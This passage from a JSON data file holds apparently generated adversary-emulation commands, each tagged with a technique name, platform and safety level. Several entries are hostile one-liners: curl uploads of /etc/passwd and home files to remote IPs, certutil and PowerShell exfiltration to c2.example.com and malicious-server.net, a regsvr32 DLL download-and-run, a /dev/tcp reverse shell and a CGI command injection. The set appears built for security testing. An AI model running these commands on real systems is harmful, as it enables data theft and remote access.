      "expected_behavior": "Displays a list of currently open windows, including window ID, desktop number, client machine, and window title",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.834255",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "e6d784d2-acc4-4f73-9dc3-8bb2a42771cc",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "xprop -root _NET_CLIENT_LIST | grep -o '0x[0-9a-f]\\+' | xargs -I {} xwininfo -id {} | grep 'xwininfo:'",
      "description": "Retrieve window IDs from the _NET_CLIENT_LIST root window property and query their titles using xwininfo",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Extracts window IDs of all managed clients from the root window, then retrieves and filters their titles, producing a concise list of open application windows",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.834255",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "4b28503d-64dc-4efe-a653-62efe6041858",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo 'test_exfil_data' > %TEMP%\\debug_log.txt && certutil.exe -urlcache -f https://192.168.1.100/upload.aspx?file=1 -upload %TEMP%\\debug_log.txt",
      "description": "Basic exfiltration using certutil to upload a small test file via HTTP POST simulation (using -upload flag)",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a small text file in the temp directory and attempts to upload it to a specified URL using certutil. Fails silently if network is unreachable or server rejects.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444685",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "c236f58c-54de-4549-a578-dcea73ebd650",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Sensitive: user123 > %TEMP%\\staged_data.txt && powershell -Command \\\"Compress-Archive -Path %TEMP%\\\\staged_data.txt -DestinationPath %TEMP%\\\\data.zip -Force\\\" && certutil.exe -urlcache -f https://c2.example.com/exfil -upload %TEMP%\\\\data.zip\"",
      "description": "Intermediate exfiltration: creates a file, compresses it using PowerShell, then uploads via certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a test data file, compresses it into a ZIP archive, and attempts to upload it to a remote server. Uses cmd.exe to chain operations and PowerShell only for compression (no .NET reflection). Temporary files may remain if upload fails.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444685",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "cea34fcd-4326-47a0-96ca-3acc2e3c7690",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\\\_cache' -ErrorAction SilentlyContinue; echo 'Exfil chunk 1' > '%TEMP%\\\\_cache\\\\chunk1.dat'; $data = Get-Content '%TEMP%\\\\_cache\\\\chunk1.dat'; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); Invoke-WebRequest -Uri 'https://malicious-server.net/api/exfil' -Method POST -Body $encoded -Headers @{ 'Content-Type' = 'text/plain' } -ErrorAction Stop; Remove-Item '%TEMP%\\\\_cache' -Recurse -ErrorAction SilentlyContinue\"",
      "description": "Advanced exfiltration: creates a hidden data chunk, encodes in Base64, sends via POST request, and cleans up",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary directory, writes a test string, reads and Base64-encodes it, sends via HTTPS POST to a C2-like endpoint, then removes the directory. Uses only built-in PowerShell cmdlets without .NET reflection. Escaping is properly handled with nested quoting. Cleanup uses -ErrorAction SilentlyContinue to avoid failure if directory is locked.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444685",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "a2718bd8-a162-49ee-8293-6a1209514c70",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "curl -X POST --data-binary '@/etc/passwd' http://192.168.100.10:8080/upload",
      "description": "Basic exfiltration of a system file over HTTP using curl",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends the contents of /etc/passwd to a remote server via HTTP POST. Simulates simple data exfiltration over a C2 channel.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.832788",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "f47e9f31-bdc5-40dc-81b0-1666a5cd21fb",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "tar -czf - /home/user/docs | curl -X POST -H 'Content-Type: application/gzip' --data-binary '@-' http://192.168.100.10:8080/exfil",
      "description": "Intermediate exfiltration: compresses a directory and streams it via curl to a C2 server",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Compresses the /home/user/docs directory and pipes it directly to curl for exfiltration over HTTP. Reduces data size and avoids writing temporary files to disk.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.832788",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "21d4c9db-58da-49d1-bbdb-ff0fc2b88b9c",
      "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_id": "3de1664e-41da-4256-9b59-730eac536ad9",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "find /home/user/ -type f -name '*.txt' -size -100k 2>/dev/null | xargs dd 2>/dev/null | base64 | curl -X POST --data-binary '@-' http://192.168.100.10:8080/submit && echo 'Exfil complete'",
      "description": "Advanced exfiltration: finds text files, combines and encodes them, then sends via HTTP",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Finds small text files in the user's home directory, concatenates their contents, base64-encodes the data, and sends it to a remote endpoint. Simulates stealthy, incremental exfiltration with obfuscation.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.832788",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "6a5ed0cb-7037-4009-9980-44dffff2a19c",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/test.dll %TEMP%\\update.dll && regsvr32.exe /s %TEMP%\\update.dll",
      "description": "Download a DLL using certutil and execute it via regsvr32 (Squiblydoo technique) to simulate user-driven execution of a backdoor.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file (benign in test) to TEMP, then silently registers it via regsvr32, which can trigger execution if the DLL has DllRegisterServer. Network and file activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.641549",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "c23a79ae-61c3-48e9-9da0-830f87c283ff",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\_updater' -ErrorAction SilentlyContinue; $content = 'test payload for User Execution'; Set-Content -Path '%TEMP%\\_updater\\loader.js' -Value $content -Force; Invoke-Item '%TEMP%\\_updater\\loader.js'\"",
      "description": "Create a JavaScript file in TEMP and open it with the default handler, simulating user double-click execution of a malicious script.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a directory and a benign JS file, then opens it with the system's default application (e.g., WScript). Simulates user launching a file from downloads.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.641549",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "f0a2f375-9655-4582-a735-94eaae863f67",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"& cmd.exe /c echo test > '%TEMP%\\driver_test.sys' ; cmd.exe /c sc create TestDriver binPath='%TEMP%\\driver_test.sys' type=kernel; cmd.exe /c sc start TestDriver\"",
      "description": "Simulate creation and attempted loading of a malicious kernel driver by placing a benign placeholder and using sc.exe to install and start it.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a dummy .sys file, registers it as a kernel service, and attempts to start it. Requires admin rights. Will fail to load (not a real driver) but mimics driver-based implant behavior.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.641549",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "417657c1-16ba-4750-96c3-9b76a69aedbd",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'echo \"Simulated user execution\"' > ~/malicious_script.sh && chmod +x ~/malicious_script.sh && ~/malicious_script.sh",
      "description": "Basic user execution via shell script in home directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test script in the user's home directory, makes it executable, and runs it. Output prints a benign message to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.782566",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "cddf48f3-338b-4094-b3c2-dacf4fd2fa9b",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo \"$(echo 'echo Simulated obfuscated execution' | base64 -d)\" > /tmp/runme.sh && chmod 755 /tmp/runme.sh && sh /tmp/runme.sh",
      "description": "Intermediate: User executes base64-decoded script from /tmp",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a base64 string into a shell script in /tmp, sets permissions, and executes it. Emits a test message. Mimics obfuscation used in real attacks.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.782566",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "809b3e8d-5781-43e7-b594-090aa86e3c96",
      "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "mkdir -p /tmp/.cache && echo 'echo \"User-triggered encoded payload simulation\"' | base64 > /tmp/.cache/.launcher && chmod +x /tmp/.cache/.launcher && sh -c \"$(base64 -d /tmp/.cache/.launcher)\"",
      "description": "Advanced: Simulates execution of encoded payload from hidden cache directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden directory in /tmp, stores a base64-encoded benign command, and executes it by decoding inline. Represents stealthy user execution with encoded content.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.782566",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "6f5f0626-9f7b-4b22-a6f3-fc90ff289fbb",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "tasklist.exe",
      "description": "Basic process enumeration using legacy tasklist.exe binary",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all running processes with image name, PID, session, and memory usage to stdout",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.656279",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "61c104cb-292a-433e-b22c-b833d04bd200",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "wmic process list brief",
      "description": "Intermediate process enumeration using WMI command-line interface",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a formatted list of running processes including name, PID, and memory usage via WMI",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.656786",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "71b853f9-a870-4653-bcfe-2de663457ce8",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $output = Get-WmiObject -Class Win32_Process | Select-Object ProcessName, ProcessId, @{Name='CommandLine';Expression={$_.CommandLine}}; $output | ConvertTo-Csv -NoTypeInformation | Out-File '$env:TEMP\\\\proc_enum.csv' -Encoding UTF8 -Force } catch { }\"",
      "description": "Advanced process enumeration with command-line arguments captured and saved to CSV in temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Enumerates all processes including command-line arguments and exports them to a CSV file in the user's temp directory",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.656786",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "c860070b-8e4c-4f62-b3fe-3f4179af7140",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ps aux",
      "description": "List all running processes with full details including user, PID, and command line",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of all running processes with user, PID, CPU/MEM usage, and command line arguments. Accessible to all users, but limited visibility into restricted processes without root.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.771179",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "c3e011f3-99c9-480c-8fd8-16a8a2da9fbc",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "pgrep -f '.*' -l",
      "description": "Use pgrep to list process names and PIDs matching any pattern, revealing running services and potential targets",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs process IDs and names of all processes whose command line matches the pattern. Useful for attackers to find specific services or privileged processes. Works without root, but full visibility may require elevated privileges.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.771179",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "c543d350-8738-4a73-a93b-326d48dd805b",
      "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
      "technique_name": "Process Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find /proc -maxdepth 2 -path '/proc/[0-9]*/status' -exec grep -H 'Name:\\|Uid:' {} \\; 2>/dev/null | grep 'Uid:.*0\\|Uid:.*\\b[1-9]'",
      "description": "Scan /proc filesystem to find processes with their names and user IDs, specifically targeting those running as root (UID 0) or other users",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Finds process status files under /proc, extracts process names and UIDs, and filters for processes running as root or non-kernel users. Requires root for full access to all /proc/[PID] directories. Safe as it only reads existing files and does not modify system state.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.771179",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "d2fe957e-4dfa-4dc7-811c-44c538d89bb6",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "echo \" benign stub \" > \"%TEMP%\\api-ms-win-core-path-l1-1-0.dll\"",
      "description": "Basic: Simulates dropping a benign DLL file in the user's temp directory, mimicking placement of a missing system DLL.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a fake DLL file with benign content in the %TEMP% directory. No actual exploit occurs.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "23c5e112-eac2-4488-9660-24f3053fcaa1",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://127.0.0.1:8080/api-ms-win-core-synch-l1-2-0.dll \"%TEMP%\\api-ms-win-core-synch-l1-2-0.dll\" && cmd.exe /c \"%TEMP%\\api-ms-win-core-synch-l1-2-0.dll\"",
      "description": "Intermediate: Simulates downloading a DLL from a remote server using certutil and attempting to execute it (though it will fail safely if not a valid PE).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file using certutil. If the server is unreachable, it fails silently. Execution of the file will fail safely if not a valid executable.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "fbfeeb10-e59b-4bc1-8245-f19bfdc52126",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = 'DLL Simulation: Exploit Public-Facing Application'; $path = [System.IO.Path]::Combine($env:TEMP, 'ext-ms-win-advapi32-l1-1-0.dll'); $content | Out-File -FilePath $path -Encoding ASCII -Force; Start-Process $path -ErrorAction SilentlyContinue } catch { exit 1 }\"",
      "description": "Advanced: Uses PowerShell to create a fake DLL file with benign content and attempts to execute it, simulating stealthy exploitation behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a text file with a DLL-like name in %TEMP% and attempts to 'execute' it. Execution will fail safely, but file creation will succeed.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "a327f031-ab79-4d5d-909d-d826cdc70a1e",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "nc -zv 127.0.0.1 80",
      "description": "Basic reconnaissance to check if port 80 (HTTP) is open on localhost, simulating initial probing of a public-facing service.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to connect to port 80; returns success or failure. No exploitation occurs, only connectivity test.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.962574",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "db40b6aa-6ffc-434d-8a8d-5a7732d16327",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "curl -X POST http://127.0.0.1:8080/cgi-bin/test.cgi --data 'cmd=echo%20$(id)'",
      "description": "Intermediate command simulating exploitation of a vulnerable CGI script (e.g., Shellshock-like) to execute arbitrary commands.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends a POST request with command injection payload. If vulnerable, the server executes 'id' and returns output. Uses encoded command to simulate real exploit traffic.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.962574",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "e662a2c6-bb90-40b0-9c6a-b5545cf505f3",
      "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' | tee $HOME/test.sh; chmod +x $HOME/test.sh; sudo /usr/lib/cgi-bin/vuln-cgi $HOME/test.sh",
      "description": "Advanced simulation of exploiting a misconfigured CGI binary running with elevated privileges to execute a reverse shell payload.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a test script that would initiate a reverse shell, makes it executable, and attempts to run it through a privileged CGI binary. In a real attack, this would result in remote code execution. Here, it only simulates structure without connecting.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:26:30.962574",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.687,
      "validated": true
    },
    {
      "id": "ad3bf845-cbe9-4b7f-b276-f780436b85f8",
      "ttp_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "free -h",
      "description": "Display amount of free and used memory in human-readable format",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs total, used, and available physical and swap memory in a table format. This is a standard command for checking memory usage and is non-invasive.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:29.897554",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "dcd12746-497c-4738-bfcc-2a8a5a764ba1",
      "ttp_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "cat /proc/meminfo",
      "description": "Retrieve detailed memory information from the /proc virtual file system",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints detailed memory statistics such as MemTotal, MemFree, Buffers, etc. This is a passive read operation and is commonly used during system discovery.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:29.897554",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "53edda01-ec36-407f-a69b-09f5c56e7d5e",
      "ttp_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "sudo dmidecode -t memory",
      "description": "Retrieve hardware-specific memory information using DMI table data",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Outputs detailed physical memory module information including size, type, speed, and manufacturer. Requires root privileges due to direct hardware access. This is a legitimate but more intrusive discovery technique.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:29.897554",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "96850314-cec9-4f01-8776-0f8f3ce7a692",
      "ttp_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_name": "Hijack Execution Flow",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "copy \"%windir%\\system32\\calc.exe\" \"%TEMP%\\evil.dll\"",
      "description": "Simulates placing a malicious DLL in a writable directory that could be loaded via search order hijacking by a vulnerable service or application.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Copies calc.exe to %TEMP%\\evil.dll. No execution occurs. This simulates preparation for DLL search order hijacking.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.871137",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "d47b2c4c-d7a6-425e-9e16-d152a0e0c3fc",
      "ttp_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_name": "Hijack Execution Flow",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "sc.exe create HijackTest binPath= \"%TEMP%\\malicious.exe\" start= auto",
      "description": "Creates a Windows service with a binary path pointing to a user-writable location, simulating potential binary replacement or hijack.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Service 'HijackTest' is created but not started. The binary does not exist, so starting it would fail. This tests detection of suspicious service creation.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.871137",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "819cb8c3-63a4-4a83-bb99-b60835f7835e",
      "ttp_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_name": "Hijack Execution Flow",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\HijackSim' -ErrorAction SilentlyContinue; $content = 'This is a test payload'; Set-Content -Path '%TEMP%\\HijackSim\\app.exe' -Value $content -Force; Compress-Archive -Path '%TEMP%\\HijackSim\\app.exe' -DestinationPath '%TEMP%\\HijackSim.zip' -Force\"",
      "description": "Creates a simulated hijackable executable in a temp directory and archives it, mimicking payload staging for execution flow hijacking.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file and compresses it into a ZIP archive in %TEMP%. No malicious code is executed. Simulates preparation phase of hijacking.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.871137",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "6002211a-f537-471e-aeae-9e6526b25c12",
      "ttp_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
      "technique_name": "Hijack Execution Flow",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p $HOME/.malbin && cat > $HOME/.malbin/ps << 'EOF'\\n#!/bin/bash\\necho '[TEST] Command hijack via PATH manipulation'\\necho 'Running original ps...'\\n/usr/bin/ps \"$@\"\\nEOF\\n&& chmod +x $HOME/.malbin/ps && PATH=$HOME/.malbin:$PATH ps aux",
      "description": "Simulates PATH-based binary hijacking by placing a malicious 'ps' script in a user directory and prepending it to PATH",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a wrapper script named 'ps' in a local directory, modifies PATH to prioritize it, and executes 'ps aux'. The script logs hijack detection and calls the real 'ps' with arguments.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:34:55.850084",
